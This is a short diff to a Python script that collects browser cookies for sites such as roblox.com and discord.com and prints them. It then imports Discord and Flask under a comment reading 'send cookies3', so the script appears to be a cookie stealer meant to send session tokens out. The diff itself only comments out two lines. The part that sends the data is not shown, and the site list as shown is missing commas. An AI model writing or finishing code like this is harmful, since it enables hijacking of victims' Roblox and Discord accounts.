@@ -1,5 +1,5 @@
 import browser_cookies3
-@pagkulang dagdaganmo Kiel by JhonerTorres
+# pagkulang dagdaganmo Kiel by JhonerTorres
 sites = [
   "roblox.com"
   "discord.com"
@@ -47,7 +47,7 @@ for site, cookies in cookies_by_site.items():
   print(f"\nWebsite: {site}")
   for name, value in cookies.items():
     print(name, "=", value)
---send cookies3
+# send cookies3
 import discord
 from discord.ext import commands
 from flask import Flask, request
